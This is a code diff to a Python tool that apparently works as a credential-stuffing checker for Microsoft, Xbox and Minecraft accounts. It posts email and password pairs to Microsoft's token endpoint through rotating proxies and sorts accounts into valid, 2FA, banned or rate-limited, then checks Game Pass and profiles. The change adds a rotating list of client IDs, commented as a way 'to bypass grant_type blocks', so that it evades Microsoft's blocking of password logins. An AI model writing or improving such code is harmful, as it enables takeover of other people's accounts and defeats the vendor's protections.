@@ -38,8 +38,13 @@ MC_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"
 GAMEPASS_URL = "https://collections.mp.microsoft.com/v9.0/collections/publisherQuery"
 REWARDS_URL = "https://prod.rewardsplatform.microsoft.com/dapi/me?channel=SAAndroid&options=511"
 
-# Switched back to the Minecraft Client ID which allows ROPC (password grant)
-CLIENT_ID = "00000000402B5328"
+# Rotating list of Client IDs to bypass grant_type blocks
+CLIENT_IDS = [
+    "0000000048093EE3", # Xbox Android
+    "0000000040170455", # Xbox
+    "00000000402B5328", # Minecraft
+    "000000004C12AE6F"  # Xbox Live
+]
 SCOPE = "service::user.auth.xboxlive.com::MBI_SSL"
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
@@ -104,25 +109,36 @@ def detect_country(email: str, jwt_country: str = "") -> str:
     return "US"
 
 async def ms_ropc(session, email, password):
-    payload = {"client_id": CLIENT_ID, "scope": SCOPE, "grant_type": "password", "username": email, "password": password}
-    headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    proxy = pick_proxy()
-    try:
-        async with session.post(MS_TOKEN_URL, data=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
-            body = await r.text()
-            if r.status == 200: return {"ok": True, "data": await r.json()}
-            low = body.lower()
-            if "aadsts50076" in low or "interaction_required" in low: return {"ok": False, "kind": "2FA"}
-            if "aadsts50053" in low or "aadsts50057" in low or "aadsts50055" in low: return {"ok": False, "kind": "BANNED"}
-            if r.status == 429: return {"ok": False, "kind": "RATE"}
-            
-            err_msg = ""
-            try:
-                err_json = await r.json()
-                err_msg = err_json.get("error_description", err_json.get("error", "unknown"))
-            except: err_msg = body[:50]
-            return {"ok": False, "kind": "BAD", "detail": err_msg}
-    except Exception as e: return {"ok": False, "kind": "ERR", "detail": str(e)}
+    # Loop through client IDs until one works
+    for client_id in CLIENT_IDS:
+        payload = {"client_id": client_id, "scope": SCOPE, "grant_type": "password", "username": email, "password": password}
+        headers = {"Content-Type": "application/x-www-form-urlencoded"}
+        proxy = pick_proxy()
+        try:
+            async with session.post(MS_TOKEN_URL, data=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+                body = await r.text()
+                if r.status == 200: return {"ok": True, "data": await r.json()}
+                
+                low = body.lower()
+                # If it's a grant_type error, try the next client ID instantly
+                if "grant_type" in low or "invalid_client" in low:
+                    continue
+
+                if "aadsts50076" in low or "interaction_required" in low: return {"ok": False, "kind": "2FA"}
+                if "aadsts50053" in low or "aadsts50057" in low or "aadsts50055" in low: return {"ok": False, "kind": "BANNED"}
+                if r.status == 429: return {"ok": False, "kind": "RATE"}
+                
+                err_msg = ""
+                try:
+                    err_json = await r.json()
+                    err_msg = err_json.get("error_description", err_json.get("error", "unknown"))
+                except: err_msg = body[:50]
+                return {"ok": False, "kind": "BAD", "detail": err_msg}
+        except Exception as e: 
+            continue # Try next client ID on network error
+
+    # If we loop through all and they all fail with grant_type
+    return {"ok": False, "kind": "BAD", "detail": "All Client IDs blocked (grant_type)"}
 
 async def xbox_user_auth(session, ms_access):
     payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": f"d={ms_access}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
@@ -163,12 +179,7 @@ async def xbox_profile(session, xsts_token, uhs, xuid):
     return {}
 
 async def check_gamepass(session, xsts_token, uhs):
-    payload = {
-        "market": "US",
-        "language": "en-US",
-        "productSkuIds": ["9N0L65V3Z5T3"],
-        "expandSatisfyingItems": True
-    }
+    payload = {"market": "US", "language": "en-US", "productSkuIds": ["9N0L65V3Z5T3"], "expandSatisfyingItems": True}
     headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "Content-Type": "application/json", "Accept": "application/json"}
     try:
         async with session.post(GAMEPASS_URL, json=payload, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
